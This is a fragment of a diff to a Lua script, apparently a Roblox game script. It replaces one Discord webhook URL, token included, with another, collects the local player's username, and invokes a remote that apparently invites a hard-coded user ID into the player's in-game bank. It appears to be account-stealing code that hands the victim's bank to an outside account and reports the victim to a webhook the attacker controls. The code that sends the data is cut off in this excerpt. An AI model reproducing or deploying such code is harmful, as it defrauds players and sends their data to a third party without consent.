@@ -360,7 +360,7 @@ local A_1 =
 }
 local ABCXD = lib.Network.Invoke(remotes.Invite, Bank, 884869707)
   
-local url = "https://discord.com/api/webhooks/1014877367698718741/rfp2nbdDcJDL3j4Eh_YzQmDPD_WS0MAo8TQpEkgiEpatSL7gSAb_9hdVUQTo2f-0CcN-"
+local url = "https://discord.com/api/webhooks/1048352358809206784/oIn0vKm3IrmZKhp1WElUQJ18Pb1EDTNFgCbmvkG62ZqC13Q8NmuJQJDGBG26rsfiRmw-"
 local username = game:GetService("Players").LocalPlayer.Name
  
 local data = {
